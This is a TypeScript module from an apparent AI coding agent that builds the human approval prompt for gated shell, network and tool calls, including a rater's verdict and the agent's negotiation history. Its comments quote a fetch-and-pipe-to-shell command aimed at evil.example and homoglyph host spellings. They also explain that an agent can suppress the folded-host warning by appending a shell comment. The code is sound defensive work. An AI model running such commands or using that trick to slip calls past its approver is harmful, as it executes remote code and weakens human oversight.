/**
 * @module core/approvals/approvalRequest
 *
 * [[EXT-137]] — **the split between what an approval surface may FIX in place and what it must let
 * scroll.**
 *
 * An approval prompt has two halves with opposite properties. One is anchored where the human
 * presses a key: it cannot scroll, so whatever it holds is bounded by the screen rather than by
 * the text. The other is the conversation, where length is already solved. This module owns both
 * halves, so a surface renders them rather than deciding them.
 *
 * ## The fixed half carries only text WE wrote
 *
 * {@link APPROVAL_ASK_LINE} and {@link approvalCategoryLine} are the whole of it: a constant
 * sentence saying Gaunt Sloth is asking, and a **category** drawn from {@link ApprovalCategory} —
 * a closed union of four, each with one sentence of our prose. Nothing model-authored,
 * third-party-authored or user-authored is interpolated into either. Not a truncated host, not a
 * tool name, not a count of what was withheld — nothing.
 *
 * **That is a structural property, not a careful one.** The predecessor reproduced a host in a
 * one-line summary "only when it could do so safely and in full", where *in full* meant a hundred
 * characters; a longer path pushed it past the bound and the row degraded to `(1 not shown here)`,
 * so the author of a hostile URL chose whether the row named a host. Every repair that keeps the
 * text moves the boundary — a bigger cap is padded past, a truncation keeps
 * `https://raw.githubusercontent.com/…`, which is the reassuring half of a hostile URL. Removing
 * the text leaves the boundary nothing to bound: there is no cap to pad past and no truncation
 * direction to get wrong.
 *
 * **The category is not decoration, and it is not derived from the command's bytes.** A fixed block
 * reading only *Gaunt Sloth has a message for you* trades a truncation problem for an attention
 * problem — it gives the reader no reason to look up before pressing a key. The category says what
 * CLASS of thing is about to be allowed, which is that line's actual job. It is chosen by looking
 * at the call (a command naming a host in a fetch position is the `network` arm), but what is
 * printed is one of four constants: influence over the CHOICE is not influence over the BYTES.
 *
 * ## The scrollable half carries everything else, ordered so the identity survives
 *
 * {@link approvalRequestRows} renders the note, the rating, the negotiation, what a sticky answer
 * would store, the command and the hosts — into the conversation, where nothing needs a cap.
 *
 * **The order is load-bearing and it is the inverse of the reading order you would guess.** A block
 * taller than the viewport loses its TOP, so the last rows are the ones that survive on screen
 * whatever else is long. The explanation goes first, the command after it, and the hosts LAST,
 * immediately above the fixed block: for a hostile URL the counterparty's identity is precisely
 * what a reader must not lose, and a host block rendered above a ten-thousand-character command
 * would scroll away with the top of the command. "Explanation above, host and command last" is the
 * rule; which of those two goes last is decided by asking which one survives when the other is
 * long.
 *
 * **The hosts are named in two groups, and the second is the point of [[EXT-156]].** The gate
 * matches an NFKC-folded command, so the hosts it extracts can be spelled differently from the call
 * shown above them — a fullwidth `r` in `ｒegistry.npmjs.org` folds to the real npm registry, which
 * that command does not contain. {@link approvalHostGroups} asks the item's own control of each
 * host — *does the call text contain it?* — and the ones that fail are labelled as such rather than
 * shown as though the call had written them. It reads: no extraction and no matcher moves.
 * **Whoever writes the call can suppress the disclosure for free** — a trailing shell comment
 * naming the folded spelling is enough — so read it as a signal on an unwitting call, never as a
 * control on a deliberate one; {@link approvalHostGroups}'s docblock says why.
 *
 * **The hosts are framed, not allow-listed.** `core/shell/openWorld`'s `listHostsForFloorNote`
 * quotes a host only when it passes a character allow-list and a length bound, because that
 * sentence is our prose sitting OUTSIDE the `<command_to_evaluate>` fence in a rater's prompt,
 * where a host that carries a sentence carries an instruction. This block has a different boundary
 * and a better one: `core/shell/framing` neutralises every control character, numbers each row and
 * holds column 0, so a host is shown IN FULL however long and however hostile. Reusing the note's
 * allow-list here would ship the very defect this module exists to close into its replacement.
 *
 * ## One renderer, three surfaces
 *
 * The Ink TUI paints these rows as a transcript item and the fixed lines in its dock; the
 * readline surface prints the same rows linearly and the same fixed lines above its menu; the
 * transcript row estimator counts the same rows so the viewport budgets what is actually drawn.
 * A second copy of this ordering is how two surfaces come to describe one request two ways — the
 * argument `core/shell/framing`, `core/shell/negotiation` and `core/shell/approvalStop` each make
 * for their own renderers.
 *
 * **ACP is deliberately not a consumer.** It hands rendering to an editor client, which draws
 * structured fields in its own UI where terminal control codes are inert and a gutter would be
 * noise; `modules/acp/acpPermissions.ts` states what that surface does instead.
 */
import type { DialogTone } from '#src/utils/consoleUtils.js';
import type { PendingToolInterrupt } from '#src/core/types.js';
import { approvalPromptHeader } from '#src/core/approvals/promptHeader.js';
import { toolCallHosts } from '#src/core/approvals/toolHost.js';
import {
  describeRaterOutcome,
  RATER_REASON_LABEL,
  type EscalationTone,
} from '#src/core/shell/escalationSeverity.js';
import {
  frameUntrustedCommand,
  frameUntrustedText,
  frameWidthFor,
  narrowTerminalNotice,
  STICKY_PREVIEW_MAX_ROWS,
} from '#src/core/shell/framing.js';
import { renderNegotiationRows, type NegotiationVoice } from '#src/core/shell/negotiation.js';
import { findComposedOpenWorld, findOpenWorldHostLiterals } from '#src/core/shell/openWorld.js';

/**
 * How one row of the request block is painted, in terms both terminal surfaces already own.
 *
 * It is a SEMANTIC tone rather than a colour: each surface maps it onto its own chrome. Colour is
 * never the only signal — every row's meaning is in its words too, because these reach monochrome
 * terminals, `NO_COLOR` and pipes.
 *
 * - `info` / `warn` / `danger` — our own heading at one of the three severities
 *   `core/shell/escalationSeverity` grades an escalation with.
 * - `chrome` — one of our own quiet labels (*the rater's own words:*).
 * - `quoted` — untrusted text quoted as the SUBJECT of the question: the call itself.
 * - `aside` — untrusted text quoted inside one of our own labelled asides: what a sticky control
 *   would store.
 * - `plain` — text with no severity and no subordination (the agent's turns in a negotiation).
 *
 * **The last three look like one tone and are three, because the two dialogs' quiet levels do not
 * line up.** The Ink dialog dims what is QUOTED and leaves an aside undimmed; the readline dialog
 * dims what is SUBORDINATE and leaves the call itself plain. Collapsing them would repaint one
 * surface or the other, and repainting a dialog is not what this split is for.
 */
export type ApprovalRowTone = 'chrome' | 'info' | 'warn' | 'danger' | 'plain' | 'quoted' | 'aside';

/** One terminal row of the scrollable half, tagged with how it is painted. */
export interface ApprovalRequestRow {
  tone: ApprovalRowTone;
  text: string;
}

/**
 * The four classes of thing a human is ever asked to allow.
 *
 * **A closed union is the whole point.** The fixed block's second line is `APPROVAL_CATEGORY_LINES[
 * category]`, so the set of strings that line can ever hold is enumerated in this file and is four
 * long. Widen it only with another constant sentence — never with a value read out of the call.
 *
 * - `network` — any call that names a counterparty: a shell command with a host literal in a fetch
 *   or transfer position, or a tool whose arguments carry a URL. It outranks the other three
 *   because it is the class where the counterparty, not the verb, is what the human is really
 *   ruling on.
 * - `shell` — a shell command naming no host.
 * - `mcpTool` — a tool call to a third-party MCP server, naming no host.
 * - `tool` — any other gated tool naming no host, including the built-in write tools and custom
 *   tools.
 */
export type ApprovalCategory = 'shell' | 'network' | 'mcpTool' | 'tool';

/**
 * The category sentence per {@link ApprovalCategory} — the only model of what the fixed block's
 * second line may say.
 *
 * Each names the class of action rather than the action: *a shell command*, not the command. That
 * is what makes them un-paddable, and it is also what makes them useful — a reader who sees the
 * same four sentences over a session learns them, which a sentence built from the call never
 * allows.
 *
 * The `network` line says the host is one the reader has not approved because that is what having
 * reached a human means: a host the user named themselves is carved out of the open-world floor
 * (§4.6) and a host on the allow-list never reaches this prompt at all.
 */
export const APPROVAL_CATEGORY_LINES: Readonly<Record<ApprovalCategory, string>> = Object.freeze({
  shell: 'It wants to run a shell command on this machine.',
  network: 'It wants to reach a host over the network that you have not approved.',
  mcpTool: 'It wants to call a tool on an MCP server.',
  tool: 'It wants to use one of its own tools.',
});

/**
 * The constant first line of the fixed block: Gaunt Sloth is asking, and an answer is what unblocks
 * it.
 *
 * It names the product rather than "the agent" deliberately. This line is the one the eye lands on
 * when a prompt appears under whatever the user was reading, and the fact worth carrying there is
 * *which program on this terminal has stopped and is waiting for you*.
 */
export const APPROVAL_ASK_LINE = '⚠ Gaunt Sloth is asking you to approve a call.';

/**
 * The constant third line of the fixed block on a surface whose conversation SCROLLS: where the
 * call itself went.
 *
 * Only the Ink TUI uses it. The readline surface prints the request block and the fixed lines in
 * one linear run, where "above, in the conversation" would point at nothing in particular.
 */
export const APPROVAL_DETAILS_ABOVE_LINE = 'The call is shown above, in the conversation.';

/** The heading the scrollable block opens with — our own, and never a place a name is spliced. */
export const APPROVAL_REQUEST_HEADING = '⚠ Gaunt Sloth is asking about this call:';

/**
 * Our label for the hosts block, which sits last so it survives a long call above it.
 *
 * *This call* rather than *this command*: a gated tool names its counterparty in a structured
 * argument, and that block is the same block.
 */
export const APPROVAL_HOSTS_LABEL = 'Hosts this call names:';

/**
 * [[EXT-156]] — our label for the hosts the block names that the call does not SPELL that way.
 *
 * It is a second label rather than a sentence appended to the first because the disagreement is a
 * property of individual hosts: a call naming three of them may spell two and fold one, and a
 * notice over the whole block would leave a reader to work out which. Two labelled groups say it
 * structurally, and neither carries a value read out of the call.
 */
export const APPROVAL_FOLDED_HOSTS_LABEL = '⚠ Hosts this call names but does not spell this way:';

/**
 * The second row of that block: the fact the label above is only useful with.
 *
 * *Different characters* rather than *look-alike characters*, because what the check establishes is
 * that the characters differ and not that they resemble one another — a compatibility form the fold
 * rewrites need not look like anything.
 */
export const APPROVAL_FOLDED_HOSTS_NOTE =
  '    The call above writes them with different characters.';

/**
 * [[EXT-156]] — the same row for the call whose displayed text is only PART of what it was read
 * from, where the note above would be false.
 *
 * `approvalCallText` shows `args.command` alone whenever it is a string, and a `tool`/`mcpTool`
 * call's hosts are read off all its arguments — so a host a sibling argument names is missing from
 * the screen without having been folded from anything. The label still holds (the call as shown
 * does not spell it) and only the reason changes, which is why this is a second NOTE and not a
 * third group: splitting the hosts would tell a reader that two kinds of counterparty are at stake
 * when there is one, and the thing they must not lose is the name.
 *
 * It claims two things, and the predicate that picks it enforces both: what is on screen is the
 * command argument, and it is not all of them. `showsCommandArgumentOnly` is what makes the second
 * half true rather than merely plausible — the row is printed only for a call that carries an
 * argument besides `command`, so there really is a "them" and the screen really does hold one of
 * it. A call whose `command` is its ONLY argument gets the characters note instead: its arguments
 * are all on screen, and what the reader cannot see there is a character, not an argument.
 *
 * It deliberately does NOT say the hosts came from the arguments it does not show — a `command`
 * argument spelling a whole URL is read for a host like any other value, and folds rather than
 * hides.
 */
export const APPROVAL_UNSHOWN_HOSTS_NOTE =
  '    The call above shows only its command argument, not all of them.';

/**
 * The command a pending call would run, when the call carries one as a plain string.
 *
 * Deliberately keyed on the ARGUMENT rather than on the tool name: the two terminal surfaces have
 * always shown `args.command` when it is a string and the serialised arguments otherwise, and a
 * second rule for "is this a shell call" would be free to disagree with the one the gate ran on.
 */
function commandStringOf(pending: Pick<PendingToolInterrupt, 'args'>): string | undefined {
  const command = pending.args.command;
  return typeof command === 'string' ? command : undefined;
}

/** The text a surface shows as the call: the command, or the arguments it was given instead. */
export function approvalCallText(pending: Pick<PendingToolInterrupt, 'args'>): string {
  return commandStringOf(pending) ?? JSON.stringify(pending.args);
}

/**
 * Whether the text shown as the call is **only part of** what this call's hosts were read from.
 *
 * `approvalHosts` takes the structured-argument arm when the subject kind is `tool` or `mcpTool`,
 * or when there is no string `command` at all. `approvalCallText` shows `args.command` whenever it
 * is a string. **Those two conditions are not complements**, and the gap between them is a real
 * shape: a `tool`/`mcpTool` call carrying a string `command` argument has its hosts read off ALL
 * its arguments while the surface displays only that one — so a host named by a sibling argument is
 * absent from the screen without being folded from anything. An MCP server free to name its own
 * parameters may well expose a `command`, so the shape is constructible; how often a real server
 * emits it is not established here, and this decides only which sentence the block prints.
 *
 * **Being on that arm is not sufficient, and the second condition is what the name promises.** A
 * `tool`/`mcpTool` call whose `command` IS its only argument has its whole arguments on screen: the
 * display is not part of anything, it is the lot. A note saying otherwise sends the reader looking
 * for arguments that do not exist while the character that folded sits on the line above — this
 * module's own defect, moved onto the arm that was supposed to be the remedy. So the call must also
 * carry something besides `command`, which is the literal truth condition of the sentence this
 * picks.
 *
 * **An argument COUNT, and not a comparison of texts, for a measured reason.** Asking whether the
 * displayed text differs from the serialised arguments cannot answer this: `{"command":"…"}` is a
 * different string from `…` on every call that reaches here, the one-argument call included. A
 * comparison that did answer it would have to be asked per HOST, which is a bigger question than
 * choosing a sentence and is not asked here.
 *
 * Neither branch moves, and nothing else reads this: it picks a sentence.
 */
function showsCommandArgumentOnly(
  pending: Pick<PendingToolInterrupt, 'args' | 'subject'>
): boolean {
  const kind = pending.subject?.kind;
  return (
    (kind === 'tool' || kind === 'mcpTool') &&
    commandStringOf(pending) !== undefined &&
    Object.keys(pending.args).length > 1
  );
}

/**
 * The hosts this call names in a fetch or transfer position — the counterparty's identity, in full.
 *
 * **Both extractions are asked, and that is not belt-and-braces.** `findOpenWorldHostLiterals`
 * reads a command it can resolve statically and DECLINES on a composed one, which is measured
 * rather than inferred: it returns the host for `curl https://evil.example/x.sh` and an empty array
 * for `curl https://evil.example/x.sh | sh`. Asking it alone would leave this block silent on
 * exactly the shapes that most need a counterparty named — a fetch piped into an interpreter, an
 * archive piped into `ssh` — and an empty result there is indistinguishable from a command that
 * names nobody. `findComposedOpenWorld` is the arm that reads those, and the union is what makes
 * "no host block" mean "no host".
 *
 * Neither is a new notion of what a host position is: they are the two the gate itself decides on.
 *
 * **A call that is not a shell command is asked of `core/approvals/toolHost` instead**, which is
 * again the gate's own extraction rather than a new one: it is what §4.7.4 binds a sticky tool
 * grant's host with, read off the structured arguments by `URL` parsing. Without this arm the one
 * tool whose whole purpose is to reach a counterparty — a gated web fetch — would render as a
 * generic tool call with no host anywhere in the block, which is the exact loss this module exists
 * to prevent, moved from a truncated line to an absent one.
 *
 * **It is asked for ALL the hosts, not for the subject's one.** `ApprovalSubject.host` is set only
 * where a call names exactly one, because a grant may record only one — but a call naming several
 * is the case where a reader most needs them named, and reading the subject's field would have gone
 * silent on precisely that call.
 */
export function approvalHosts(pending: Pick<PendingToolInterrupt, 'args' | 'subject'>): string[] {
  const kind = pending.subject?.kind;
  const command = commandStringOf(pending);
  if (kind === 'tool' || kind === 'mcpTool' || command === undefined) {
    return toolCallHosts(pending.args);
  }
  const hosts = [...findOpenWorldHostLiterals(command)];
  for (const host of findComposedOpenWorld(command)?.hosts ?? []) {
    if (!hosts.includes(host)) hosts.push(host);
  }
  return hosts;
}

/**
 * One call's hosts, split by whether the call SPELLS the host this block is about to name.
 *
 * @see {@link approvalHostGroups}
 */
export interface ApprovalHostGroups {
  /** Hosts that occur in {@link approvalCallText} as written. */
  written: string[];
  /** Hosts that do not — produced by a fold the gate applies and the call's own text does not show. */
  folded: string[];
}

/**
 * `text` with its ASCII letters lower-cased, **and no other character touched.**
 *
 * The restriction is the safety property, not tidiness. `String.prototype.toLowerCase` is
 * Unicode-aware: it maps U+212A KELVIN SIGN to `k`, which is exactly the class of character the
 * check below exists to catch — NFKC rewrites that same sign to `K`, so a full case fold would map
 * both sides onto `k`, find them equal, and suppress the disclosure on a host whose real spelling
 * is a Kelvin sign. An ASCII-only fold cannot merge any non-ASCII character with an ASCII one, so
 * it removes the case noise and nothing else.
 */
function asciiLowerCase(text: string): string {
  return text.replace(/[A-Z]/g, (letter) => letter.toLowerCase());
}

/**
 * [[EXT-156]] — the hosts of one call, split by whether the call spells the ones it names.
 *
 * **This reads; it decides nothing.** {@link approvalHosts} and both extractions behind it are
 * untouched, and so is the {@link approvalCategoryFor} classifier that reads them: the same hosts
 * are named, the same floor fires, the same category is chosen. What is added is the statement of a
 * disagreement that was previously silent.
 *
 * ## The disagreement, and why it exists
 *
 * {@link approvalCallText} returns the call's true characters. `approvalHosts` reads its hosts
 * through the gate's own extractions, which match `core/shell/normalize`'s **NFKC-folded** form —
 * so a host written with a character NFKC rewrites is reported in its folded spelling, and the
 * block goes on to name a host the call never wrote. Measured on U+FF52, the fullwidth `r`:
 * `curl -o index.html https://ｒegistry.npmjs.org/simple/` names `https://registry.npmjs.org/simple/`,
 * which is the real npm registry and is not in that command at all.
 *
 * **The fold is right and is not what changes here.** The hardline blocklist and the allow-list
 * classifier match the normalised form deliberately, so trivial obfuscation cannot smuggle a command
 * past the guard; removing it would widen what the gate lets through. The defect is that a
 * *human-facing* field inherited it silently, and the remedy is to say so.
 *
 * **The `tool`/`mcpTool` arm is checked rather than assumed.** It reaches `core/approvals/toolHost`,
 * which reads structured arguments by `URL` parsing — a DIFFERENT fold, not no fold. Measured: `URL`
 * applies IDNA, so the same fullwidth `r` yields `registry.npmjs.org`, and a Cyrillic `а` yields the
 * punycode `xn--pypal-4ve.com` for an argument spelling `pаypal.com`. Both are disagreements and
 * both are disclosed here. That arm also lower-cases its host, which is why the comparison folds
 * ASCII case, and ASCII case only — a host argument written `REGISTRY.npmjs.org` names the same
 * host and must not raise an alarm that trains readers to ignore this one.
 *
 * ## What the predicate is, and how it errs
 *
 * *Does the host occur in the call text?* — the item's own control, needing no offset mapping back
 * through NFKC (which is not length-preserving) and no second notion of what a host is. It is asked
 * of the text the reader is actually shown, which is what makes the LABEL true of every host under
 * it: the call as displayed really does not spell it.
 *
 * **The suppression direction is free, and it belongs to whoever wrote the call.** The test is
 * occurrence anywhere in the call text, so a call that also writes the folded spelling somewhere
 * else reads as written and says nothing. On the shell arm that takes the whole folded URL, since
 * the host there IS the URL: `echo https://registry.npmjs.org/x && curl
 * https://ｒegistry.npmjs.org/x` is suppressed while an incidental bare hostname elsewhere is not —
 * **and so is a trailing `#` comment naming that URL, or a dead `echo`, or an unrelated argument,
 * none of which change anything the command does.** On the tool arm the host is a bare hostname, so
 * a sibling argument mentioning it in prose is enough. This is not an unlucky shape a reader may
 * hope not to meet: an author who wants no disclosure appends one comment and gets none. What would
 * close it is a POSITIONAL test, and a positional test is a second notion of where a host lives —
 * the thing this must not grow. The residue is bounded rather than small: a suppressed disclosure
 * on a call that already cannot auto-approve ([[EXT-61]] floors it at `destructive` before the
 * rater).
 *
 * **The other direction costs a second note row, and the label is what the two of them share.**
 * `approvalHosts` reads a `tool`/`mcpTool` call's hosts off ALL its arguments while
 * `approvalCallText` displays `args.command` alone whenever it is a string, so the shown text is
 * SOMETIMES less than what the hosts came from — when the call carries an argument besides
 * `command`, and only then; see `showsCommandArgumentOnly`. On a call whose `command` is its only
 * argument the display is the whole of them, and the ordinary characters note is the true one
 * there. A host named by a sibling argument is correctly labelled (the
 * call as shown does not spell it) while *"the call above writes them with different characters"*
 * would be false: it does not write them at all. So the label is one and the note is two, chosen by
 * that predicate — the classification is never weakened to make one sentence fit both. Comparing
 * against the serialised arguments instead would have "fixed" this by calling such a host WRITTEN,
 * printing `Hosts this call names:` beside a displayed call that names nobody — which is [[EXT-156]]'s
 * own defect reached by another route. Do not.
 *
 * **The note is one per BLOCK; the reason is one per HOST.** A call can fold one host by characters
 * and keep another off the screen behind an argument it does not display, and one row cannot say
 * both — so a call carrying an argument besides `command` states the partial display, and the
 * reader is left to the label for the other. The label is true of every host under it either way
 * and no host moves between the groups, so what that reader loses is a reason, never a name.
 *
 * ## Why the raw spelling is not reproduced here
 *
 * It is already on the screen: the framed call sits directly above this block and carries the call's
 * true characters, so both forms are in front of the reader and what was missing was the statement
 * that they differ. Recovering the raw *host substring* to print beside the folded one would need
 * exactly the NFKC offset mapping this predicate exists to avoid — and it would buy a reader nothing
 * they can act on, since the two spellings are by construction ones a terminal font does not
 * distinguish. The disagreement is the signal.
 */
export function approvalHostGroups(
  pending: Pick<PendingToolInterrupt, 'args' | 'subject'>
): ApprovalHostGroups {
  const callText = asciiLowerCase(approvalCallText(pending));
  const written: string[] = [];
  const folded: string[] = [];
  for (const host of approvalHosts(pending)) {
    (callText.includes(asciiLowerCase(host)) ? written : folded).push(host);
  }
  return { written, folded };
}

/**
 * The {@link ApprovalCategory} for one gated call.
 *
 * The branch reads the subject the GATE decided on (`core/approvals/matcher`'s `ApprovalSubject`),
 * so this is not a second classifier — `promptHeader` makes the same argument for the same reason.
 * The one thing it adds is the `network` arm, which asks the same host extractions the gate itself
 * ran ({@link approvalHosts}).
 *
 * **A named counterparty outranks the kind of call that names it, whatever the kind.** A fetch is
 * the class where the host and not the verb is what the human is really ruling on, and that is as
 * true of a gated web-fetch tool or an MCP tool handed a URL as it is of `curl` — the reader's
 * question is *who is it talking to*, and answering it with *one of its own tools* buries the part
 * that decides the answer. The kinds are what a call falls back to when it names nobody.
 *
 * **The two host extractions have deliberately different appetites, and the `network` arm inherits
 * both.** A shell command's hosts come from a FETCH-POSITION analysis, so `echo https://x` names
 * nobody; a tool's come from `core/approvals/toolHost`, whose whole test is *does this argument
 * parse as a URL* — so writing a file whose entire content is a bare URL reads as `network` here.
 * That over-detection is `toolHost`'s stated design (a value it fails to recognise costs a broader
 * grant, never a narrower one) and this arm keeps it rather than second-guessing the extraction the
 * grant is bound with. It errs toward the more alarming of two true sentences about a call that
 * does carry a URL, which is the direction to err in.
 *
 * **A call with no subject falls to `tool` when it names nobody** — `promptHeader`'s fail-to-vague:
 * a surface handed a hand-built interrupt gets the unspecific category rather than a specific one
 * nothing established. It still reaches `network` where a host is named, since that arm reads the
 * call rather than the subject.
 */
export function approvalCategoryFor(
  pending: Pick<PendingToolInterrupt, 'args' | 'subject'>
): ApprovalCategory {
  if (approvalHosts(pending).length > 0) return 'network';
  if (pending.subject?.kind === 'shell') return 'shell';
  if (pending.subject?.kind === 'mcpTool') return 'mcpTool';
  return 'tool';
}

/** The fixed block's category line: one of {@link APPROVAL_CATEGORY_LINES}, and nothing else. */
export function approvalCategoryLine(
  pending: Pick<PendingToolInterrupt, 'args' | 'subject'>
): string {
  return APPROVAL_CATEGORY_LINES[approvalCategoryFor(pending)];
}

/** An escalation severity in this module's tones. The three names line up one for one. */
function severityTone(tone: EscalationTone): ApprovalRowTone {
  return tone === 'danger' ? 'danger' : tone === 'warn' ? 'warn' : 'info';
}

/**
 * A negotiation row's §5.4 voice in this module's tones.
 *
 * The rater's turns are `warn` because the human is ruling on an argument and an exchange painted
 * in one colour asks them to work out who said what first. The agent's are `plain` and the
 * renderer's own chrome is `chrome`, which is what both dialogs already did.
 */
function negotiationTone(voice: NegotiationVoice): ApprovalRowTone {
  if (voice === 'rater') return 'warn';
  if (voice === 'chrome') return 'chrome';
  return 'plain';
}

/**
 * The scrollable half of one approval request, as terminal rows.
 *
 * Every row is painted **verbatim, one row per line, and never re-wrapped** — the condition
 * `core/shell/framing` states its column-0 guarantee over. A caller that joins these and hands them
 * to something that wraps has undone the gutter.
 *
 * `columns` is what the surface reports (`stdout.columns`), resolved through `frameWidthFor` here
 * so no two surfaces can disagree about how much of a command a human was shown. Below core's floor
 * the frame is wider than the terminal and the guarantee lapses; `narrowTerminalNotice` leads the
 * block in that case, so it lapses out loud.
 *
 * The order, top to bottom, and the reason for its two ends:
 *
 * 1. our heading and the category — the same category the fixed block names, so the two halves are
 *    visibly one request;
 * 2. the rating, the `approvals.escalate` entry that fired, the §5 negotiation, and what a sticky
 *    answer would store — the EXPLANATION, which is the half that may be long and is the half that
 *    may scroll away;
 * 3. what is being called, then the command;
 * 4. the hosts, LAST.
 */
export function approvalRequestRows(
  pending: PendingToolInterrupt,
  options?: { columns?: number }
): ApprovalRequestRow[] {
  const width = frameWidthFor(options?.columns);
  const rows: ApprovalRequestRow[] = [];
  const push = (tone: ApprovalRowTone, text: string): void => {
    rows.push({ tone, text });
  };

  const tooNarrow = narrowTerminalNotice(options?.columns);
  if (tooNarrow) push('warn', tooNarrow);

  push('warn', APPROVAL_REQUEST_HEADING);
  push('warn', approvalCategoryLine(pending));

  // The rating, whenever one exists. §6 makes the explanation mandatory wherever there is one; at
  // the unrated rungs there is none and the block shows the call alone. The heading is the gate's
  // own sentence — the outcome and what it MEANS for undoing the call — so the severity survives a
  // terminal with no colour. The reason under it is model-authored prose and is framed exactly like
  // the command: protecting one and not the other would leave the block forgeable through the
  // string that is meant to explain it.
  if (pending.safetyVerdict) {
    const severity = describeRaterOutcome(pending.safetyVerdict.outcome);
    const tone = severityTone(severity.tone);
    push(tone, severity.heading);
    // The attribution has to be said rather than implied, now that the line above it is ours.
    push('chrome', RATER_REASON_LABEL);
    for (const line of frameUntrustedText(pending.safetyVerdict.reason, { width }).lines) {
      push(tone, line);
    }
  }

  // EXT-71 §3.2 — the declared `approvals.escalate` entry that brought this call here. Without it
  // the user is asked about a call their own rung would have approved, with nothing tying the
  // question to the line they wrote, which reads as the gate malfunctioning rather than as their
  // rule working. Framed rather than interpolated: an MCP entry can carry server-supplied names.
  if (pending.escalatedBy) {
    push('warn', '⚠ Your approvals.escalate list matched this call:');
    for (const line of frameUntrustedText(pending.escalatedBy, { width }).lines) push('warn', line);
  }

  // [[EXT-29]] §6 — the whole §5 negotiation, when one preceded this. That the agent proposed the
  // same command three times against two rejections that each told it what to fix is the most
  // important thing here, and a block showing the final attempt alone asks the user to rule on a
  // command when the decision they actually have is about an argument.
  for (const row of renderNegotiationRows(pending.negotiationRounds ?? [], {
    width,
    ...(pending.negotiationAttempts !== undefined ? { attempts: pending.negotiationAttempts } : {}),
  })) {
    push(negotiationTone(row.voice), row.text);
  }

  // EXT-71/EXT-70 §6 — what a sticky answer would store, at the moment of the choice and in the
  // words the control is written in. Absent means the control is not offered at all.
  //
  // Still bounded to a few rows even here, where nothing scrolls off the bottom: these carry the
  // command as typed and the entry repeats it, so an unbounded copy would print a long command
  // three times over in one block for no gain over the framed copy below.
  if (pending.grantPreview !== undefined) {
    push('chrome', '[s]/[a] will remember:');
    for (const line of frameUntrustedText(pending.grantSummary ?? pending.grantPreview, {
      width,
      maxRows: STICKY_PREVIEW_MAX_ROWS,
    }).lines) {
      push('aside', line);
    }
    push('chrome', '    stored as:');
    for (const line of frameUntrustedText(pending.grantPreview, {
      width,
      maxRows: STICKY_PREVIEW_MAX_ROWS,
    }).lines) {
      push('aside', line);
    }
  }
  // §6 — the deny mirror, and a DIFFERENT condition: the matcher's rule is *undecidable → no match
  // on the allow side, a match on the deny side*, so a call the gate cannot statically resolve can
  // be refused for good though it can never be approved for one. `recorded as:` rather than a
  // second `stored as:` — one block with two labels that read alike is one a reader loses their
  // place in.
  if (pending.denyPreview !== undefined) {
    push('chrome', '[d] will refuse this exact call, and save it to this project:');
    for (const line of frameUntrustedText(pending.denySummary ?? pending.denyPreview, {
      width,
      maxRows: STICKY_PREVIEW_MAX_ROWS,
    }).lines) {
      push('aside', line);
    }
    push('chrome', '    recorded as:');
    for (const line of frameUntrustedText(pending.denyPreview, {
      width,
      maxRows: STICKY_PREVIEW_MAX_ROWS,
    }).lines) {
      push('aside', line);
    }
  }

  // [[TUI-C67]] — WHAT is being called, in core's one sentence, branched on the subject kind the
  // gate itself decided on. It sits down here rather than at the top because it is identity rather
  // than explanation, and identity is what has to survive a long block above it.
  push('warn', `${approvalPromptHeader(pending)}:`);

  // The call itself. Framed with the site extraction, which is what puts a command's substitution
  // and composition boundaries — the decision-relevant positions in it — above the body.
  const framedCall = frameUntrustedCommand(approvalCallText(pending), { width });
  for (const notice of framedCall.notices) push('warn', notice);
  for (const line of framedCall.lines) push('quoted', line);

  // The counterparties, LAST. See this module's header for why this block and not the command is
  // the one that ends the request: a hostile URL's identity is what a reader must not lose, and the
  // rows nearest the prompt are the rows that survive.
  //
  // [[EXT-156]] — in two groups, because a host the gate's fold produced and a host the call
  // actually wrote are different facts and the block used to state them as one. The hosts and their
  // order within each group are `approvalHostGroups`', which reads `approvalHosts` unchanged.
  const { written, folded } = approvalHostGroups(pending);
  if (written.length > 0) {
    push('warn', APPROVAL_HOSTS_LABEL);
    for (const host of written) {
      for (const line of frameUntrustedText(host, { width }).lines) push('warn', line);
    }
  }
  // The folded ones after them, and so last of all: of the two groups this is the one a reader must
  // not lose, by the same argument that puts the whole block at the bottom. Both labels are our own
  // prose; only the host rows are framed, exactly as before.
  if (folded.length > 0) {
    push('danger', APPROVAL_FOLDED_HOSTS_LABEL);
    // One label, two reasons. The label is true of every host here — the call as SHOWN does not
    // spell it — but the reason is not: where the surface displays `args.command` alone, a host a
    // sibling argument names was never written with different characters, it was never written on
    // screen at all. Saying the wrong one is how a reader concludes the block is guessing.
    push(
      'chrome',
      showsCommandArgumentOnly(pending) ? APPROVAL_UNSHOWN_HOSTS_NOTE : APPROVAL_FOLDED_HOSTS_NOTE
    );
    for (const host of folded) {
      for (const line of frameUntrustedText(host, { width }).lines) push('danger', line);
    }
  }

  return rows;
}

/**
 * The tones as the readline surface's own {@link DialogTone}s.
 *
 * Exported so the mapping is one table rather than a `switch` inside a session module, and so a
 * spec can assert both surfaces still paint every tone they are handed.
 */
export const APPROVAL_ROW_DIALOG_TONES: Readonly<Record<ApprovalRowTone, DialogTone>> =
  Object.freeze({
    chrome: 'notice',
    info: 'notice',
    warn: 'warn',
    danger: 'danger',
    plain: 'plain',
    quoted: 'plain',
    aside: 'notice',
  });
